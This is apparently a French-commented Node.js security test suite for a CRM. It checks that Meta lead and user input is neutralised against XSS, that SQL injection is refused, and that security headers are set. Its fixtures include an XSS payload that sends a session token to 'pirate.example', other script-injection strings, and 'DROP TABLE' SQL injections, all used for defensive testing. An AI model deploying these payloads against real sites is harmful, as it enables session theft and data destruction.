// Tests du 13/11/2026 (3e partie) : audit de securite (+ verification du retrait de la mise a jour « Hors zone »).
//  1. Injection de code dans les pages (XSS) : un lead Meta (formulaire PUBLIC)
//     ou un texte saisi dans le CRM ne peut plus contenir < > (ni " ` pour Meta).
//  2. Tentatives d'acces interdits (tables secretes, injections SQL, colonnes inventees).
//  3. En-tetes de securite du site (vercel.json).
//  4. Mise a jour ponctuelle : « Hors zone » sur les « Non qualifie » sans raison,
//     une seule fois, sans ecraser une raison deja choisie.
// Base PostgreSQL de test en memoire (PGlite). Aucune donnee reelle n'est touchee.
const { PGlite } = require('@electric-sql/pglite');
const crypto = require('crypto');
const fs = require('fs');
const { Readable } = require('stream');
const REPO = '/tmp/crm-acquadue';
const db = new PGlite();
function norm(v) { return (v && typeof v === 'object' && !(v instanceof Date) && !Buffer.isBuffer(v)) ? JSON.stringify(v) : v; }
async function runQuery(text, params) { return (await db.query(text, (params || []).map(norm))).rows; }
function getSql() {
  const sql = function (strings, ...values) {
    let text = ''; strings.forEach(function (s, i) { text += s + (i < values.length ? '$' + (i + 1) : ''); });
    return runQuery(text, values);
  };
  sql.query = runQuery; return sql;
}
const dbPath = require.resolve(REPO + '/lib/db.js');
require.cache[dbPath] = { id: dbPath, filename: dbPath, loaded: true, exports: { getSql } };
process.env.META_VERIFY_TOKEN = 'mot-secret-test';
process.env.META_APP_SECRET = 'secret-app-test';
process.env.META_PAGE_ACCESS_TOKEN = 'page-token-test';
process.env.META_LEAD_ASSIGNEE = 'Harouna';
const H = {};
['login', 'users', 'data', 'bulk-load', 'audit', 'init-db', 'version'].forEach(function (n) { H[n] = require(REPO + '/api/' + n + '.js'); });
const sqlRaw = getSql();

let pass = 0, fail = 0; const failures = [];
function check(n, c, x) { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; failures.push(n); console.log('  ✗ ' + n + (x !== undefined ? '  -> ' + JSON.stringify(x) : '')); } }
function section(t) { console.log('\n== ' + t); }
function mkRes() { return { statusCode: 200, headers: {}, body: undefined, setHeader(k, v) { this.headers[k] = v; }, status(c) { this.statusCode = c; return this; }, json(o) { this.body = o; return this; }, send(x) { this.body = x; return this; }, end() { return this; } }; }
async function call(h, o, tok) { const res = mkRes(); const headers = Object.assign({}, o.headers || {}); if (tok) headers.authorization = 'Bearer ' + tok; try { await h({ method: o.method || 'GET', query: o.query || {}, body: o.body || {}, headers }, res); } catch (e) { res.statusCode = 599; res.body = { thrown: e.message }; } return res; }
async function post(raw) {
  const res = mkRes(); const req = Readable.from([Buffer.from(raw)]);
  req.method = 'POST'; req.query = {}; req.headers = { 'x-hub-signature-256': 'sha256=' + crypto.createHmac('sha256', process.env.META_APP_SECRET).update(raw).digest('hex') };
  await H.version(req, res); return res;
}
function payload(id) { return JSON.stringify({ object: 'page', entry: [{ id: 'P1', time: 1, changes: [{ field: 'leadgen', value: { leadgen_id: id, page_id: 'P1', form_id: 'F7', ad_id: 'AD1' } }] }] }); }
const DANGER = /[<>"`]/;
const PEOPLE = {
  X1: [{ name: 'full_name', values: ['<img src=x onerror="fetch(`https://pirate.example/?t=`+localStorage.crm_session_token)">'] },
       { name: 'phone_number', values: ['+22791112233'] },
       { name: 'city', values: ['"><script>alert(1)</script>'] },
       { name: 'email', values: ['a@b.ne"><svg onload=alert(1)>'] },
       { name: 'company_name', values: ['<b>Societe</b>'] },
       { name: 'quel_<script>_produit', values: ['<iframe src=javascript:alert(1)>'] }]
};
global.fetch = async function (url) {
  const u = new URL(url); const path = u.pathname.replace(/^\/v[0-9.]+\//, ''); const fields = u.searchParams.get('fields') || '';
  const ok = function (j) { return { ok: true, status: 200, json: async () => j }; };
  if (PEOPLE[path]) return fields ? ok({ id: path, ad_id: 'AD1', ad_name: 'Pub <script>x</script>', campaign_name: 'Camp "1"', platform: 'fb' }) : ok({ id: path, field_data: PEOPLE[path] });
  if (path === 'F7') return ok({ id: 'F7', name: 'Form <b>' });
  return { ok: false, status: 400, json: async () => ({ error: { message: 'x', code: 100 } }) };
};

(async function () {
  await call(H['init-db'], {});
  const tok = (await call(H.login, { method: 'POST', body: { email: 'yvan@acquadue.ne', password: 'Admin@2026' } })).body.token;
  await sqlRaw`INSERT INTO users (nom,email,pass,role,departement,ini,col,ville,actif) VALUES ('Harouna','h@x.ne','x','collaborateur','Commercial','H','av-blue','Niamey',true)`;
  const hTok = (await sqlRaw`INSERT INTO sessions (token, user_id) SELECT 'hh' || md5(random()::text), id FROM users WHERE nom='Harouna' RETURNING token`)[0].token;

  section('1. Lead Meta piege (formulaire public)');
  let r = await post(payload('X1'));
  check('lead accepte (200)', r.statusCode === 200, r.body);
  const cl = (await sqlRaw`SELECT * FROM clients WHERE tel = '+22791112233'`)[0];
  check('fiche creee', !!cl);
  check('nom : plus aucun signe < > " ` (code inoffensif)', cl && !DANGER.test(cl.nom) && /img src=x onerror=/.test(cl.nom), cl && cl.nom);
  check('ville, email, societe : neutralises', cl && !DANGER.test(cl.ville) && !DANGER.test(cl.email) && !DANGER.test(cl.societe), cl && [cl.ville, cl.email, cl.societe]);
  check('notes (reponses + noms de pub/formulaire) : neutralisees', cl && !DANGER.test(cl.notes), cl && cl.notes);
  const pl = (await sqlRaw`SELECT * FROM pipeline WHERE tel = '+22791112233'`)[0];
  check('fiche Pipeline : neutralisee', pl && !DANGER.test(pl.nom) && !DANGER.test(pl.ville), pl);
  const nt = (await sqlRaw`SELECT texte FROM notifications ORDER BY id DESC LIMIT 1`)[0];
  check('notification : neutralisee', nt && !DANGER.test(nt.texte), nt);
  const ml = (await sqlRaw`SELECT * FROM meta_leads WHERE leadgen_id='X1'`)[0];
  check('suivi Meta (nom, pub, campagne, formulaire) : neutralise', ml && !DANGER.test(ml.nom || '') && !DANGER.test(ml.annonce || '') && !DANGER.test(ml.campagne || '') && !DANGER.test(ml.formulaire || ''), ml);

  section('2. Textes saisis dans le CRM (/api/data, /api/audit, /api/users)');
  r = await call(H.data, { method: 'POST', body: { entity: 'clients', row: { id: 7001, nom: '<script>alert(1)</script>Awa', ville: 'Niamey', notes: 'prix < 5000 et > 3000', historique: [{ txt: '<img onerror=x>' }] } } }, hTok);
  let row = (await sqlRaw`SELECT * FROM clients WHERE id = 7001`)[0];
  check('creation : < et > remplaces par ‹ › (texte toujours lisible)', r.statusCode === 201 && row.nom === '‹script›alert(1)‹/script›Awa' && row.notes === 'prix ‹ 5000 et › 3000', row);
  const hist = typeof row.historique === 'string' ? row.historique : JSON.stringify(row.historique);
  check('creation : historique (objet) neutralise en profondeur', !/[<>]/.test(hist) && /‹img/.test(hist), hist);
  r = await call(H.data, { method: 'PUT', body: { entity: 'clients', id: 7001, patch: { notes: '<svg onload=alert(1)>', raison_nq: '<b>Hors zone</b>' } } }, hTok);
  row = (await sqlRaw`SELECT * FROM clients WHERE id = 7001`)[0];
  check('modification : neutralisee aussi', r.statusCode === 200 && !/[<>]/.test(row.notes) && !/[<>]/.test(row.raison_nq), row);
  r = await call(H.data, { method: 'POST', body: { entity: 'devis', row: { id: 8001, client: 'Awa', lignes: [{ produit: '<script>', qte: 2, prix: 1000 }] } } }, hTok);
  const dv0 = (await sqlRaw`SELECT * FROM devis WHERE id = '8001'`)[0]; const dv = { lignes: typeof dv0.lignes === 'string' ? dv0.lignes : JSON.stringify(dv0.lignes) };
  check('lignes de devis : chiffres intacts, texte neutralise', r.statusCode === 201 && /"qte":2/.test(dv.lignes) && /"prix":1000/.test(dv.lignes) && !/[<>]/.test(dv.lignes), dv.lignes);
  const fichier = 'data:image/svg+xml;base64,' + Buffer.from('<svg></svg>').toString('base64');
  r = await call(H.data, { method: 'POST', body: { entity: 'documents', row: { id: 9001, nom: '<b>Doc</b>.pdf', data: fichier, mime_type: 'image/svg+xml' } } }, hTok);
  const dc = (await sqlRaw`SELECT * FROM documents WHERE id = 9001`)[0];
  check('document : contenu du fichier intact, nom neutralise', r.statusCode === 201 && dc.data === fichier && dc.nom === '‹b›Doc‹/b›.pdf', dc && dc.nom);
  r = await call(H.audit, { method: 'POST', body: { user_nom: '<i>H</i>', action: 'Test', detail: '<img src=x onerror=alert(1)>', col: 'av"><script>' } }, hTok);
  const au = (await sqlRaw`SELECT * FROM audit_log WHERE action = 'Test'`)[0];
  check('journal : texte neutralise', r.statusCode === 201 && !/[<>]/.test(au.detail) && !/[<>]/.test(au.user_nom) && !/[<>]/.test(au.col), au);
  r = await call(H.users, { method: 'POST', body: { nom: '<script>x</script>Moussa', email: 'm@x.ne', pass: 'Ab1<test>x!', role: 'collaborateur', departement: 'Commercial', ini: 'M<', ville: '<b>Zinder' } }, tok);
  const us = (await sqlRaw`SELECT nom, ini, ville FROM users WHERE email = 'm@x.ne'`)[0];
  check('compte cree : nom, initiales, ville neutralises', r.statusCode === 201 && !/[<>]/.test(us.nom + us.ini + us.ville), us);
  r = await call(H.login, { method: 'POST', body: { email: 'm@x.ne', password: 'Ab1<test>x!' } });
  check('... mais le mot de passe (avec < >) n\'est PAS modifie : connexion OK', r.statusCode === 200, r.body);

  section('3. Tentatives d\'acces interdits');
  r = await call(H.data, { query: { entity: 'users' } }, hTok);
  check('lire la table des comptes (mots de passe) via /api/data -> refuse (400)', r.statusCode === 400);
  r = await call(H.data, { query: { entity: 'sessions' } }, hTok);
  check('lire les sessions via /api/data -> refuse (400)', r.statusCode === 400);
  r = await call(H.data, { query: { entity: 'clients; DROP TABLE clients' } }, hTok);
  check('injection SQL dans le nom de la table -> refuse (400)', r.statusCode === 400 && (await sqlRaw`SELECT COUNT(*)::int AS n FROM clients`)[0].n >= 2);
  r = await call(H.data, { method: 'PUT', body: { entity: 'clients', id: 7001, patch: { 'nom = nom; DROP TABLE clients; --': 'x' } } }, hTok);
  check('injection SQL dans un nom de colonne -> ignore (400), base intacte', r.statusCode === 400 && (await sqlRaw`SELECT COUNT(*)::int AS n FROM clients`)[0].n >= 2, r.body);
  r = await call(H.data, { method: 'DELETE', body: { entity: 'clients', id: '7001 OR 1=1' } }, hTok);
  check('injection SQL dans l\'identifiant de suppression -> aucune suppression massive', (await sqlRaw`SELECT COUNT(*)::int AS n FROM clients`)[0].n >= 2, r.statusCode);
  r = await call(H['bulk-load'], {}, hTok);
  check('chargement complet : ni comptes, ni sessions, ni mots de passe', r.statusCode === 200 && r.body.data.users === undefined && r.body.data.sessions === undefined && !/scrypt\$/.test(JSON.stringify(r.body)));
  r = await call(H.users, { method: 'GET' }, hTok);
  check('liste des collegues : aucun mot de passe chiffre', r.statusCode === 200 && !/scrypt\$/.test(JSON.stringify(r.body)));
  r = await call(H.data, { query: { entity: 'clients' }, headers: { authorization: 'Bearer ' + 'a'.repeat(200) } });
  check('jeton trop long -> 401', r.statusCode === 401);
  r = await call(H.version, { query: { meta: 'status' } }, hTok);
  check('bilan Meta interdit a un Collaborateur (403)', r.statusCode === 403);

  section('4. En-tetes de securite du site (vercel.json)');
  const vj = JSON.parse(fs.readFileSync(REPO + '/vercel.json', 'utf8'));
  const all = (vj.headers.find(function (h) { return h.source === '/(.*)'; }) || { headers: [] }).headers;
  const hv = function (k) { const x = all.find(function (h) { return h.key === k; }); return x && x.value; };
  check('anti-integration dans un autre site (X-Frame-Options DENY + frame-ancestors)', hv('X-Frame-Options') === 'DENY' && /frame-ancestors 'none'/.test(hv('Content-Security-Policy') || ''));
  check('X-Content-Type-Options: nosniff', hv('X-Content-Type-Options') === 'nosniff');
  check('Referrer-Policy present', !!hv('Referrer-Policy'));
  check('cache de index.html toujours revalide (inchange)', vj.headers.some(function (h) { return h.source === '/index.html' && /no-cache/.test(JSON.stringify(h.headers)); }));

  section('5. Bloc de mise a jour « Hors zone » retire (13/11/2026 : deja fait en production, 353 fiches)');
  const marker = 'Mise a jour : raison « Hors zone » (13/11/2026)';
  await sqlRaw`INSERT INTO clients (id, nom, statut, raison_nq) VALUES (101, 'NQ sans raison', 'Non qualifie', NULL), (103, 'NQ faux numero', 'Non qualifie', 'Faux numero')`;
  const avant = (await sqlRaw`SELECT COUNT(*)::int AS n FROM audit_log WHERE action = ${marker}`)[0].n;
  r = await call(H['init-db'], {}, tok);
  const g = async function (id) { return (await sqlRaw`SELECT * FROM clients WHERE id::text = ${String(id)}`)[0]; };
  check('init-db OK', r.statusCode === 200, r.body);
  check('init-db ne touche plus les raisons (une fiche sans raison le reste)', !(await g(101)).raison_nq && (await g(103)).raison_nq === 'Faux numero');
  check('aucune nouvelle ligne « Hors zone » dans le journal', avant === 0 && (await sqlRaw`SELECT COUNT(*)::int AS n FROM audit_log WHERE action = ${marker}`)[0].n === 0);
  check('le code de la mise a jour a bien disparu de init-db.js', !/Hors zone/.test(fs.readFileSync(REPO + '/api/init-db.js', 'utf8')) && r.body.mise_a_jour_13_11 === undefined);
  r = await call(H['init-db'], {});
  check('init-db sans connexion -> 401 (la mise a jour ne peut pas etre declenchee par un inconnu)', r.statusCode === 401);

  console.log('\n' + pass + ' reussis, ' + fail + ' echecs'); if (fail) console.log(failures);
  process.exit(fail ? 1 : 0);
})().catch(function (e) { console.error('ERREUR FATALE', e); process.exit(2); });
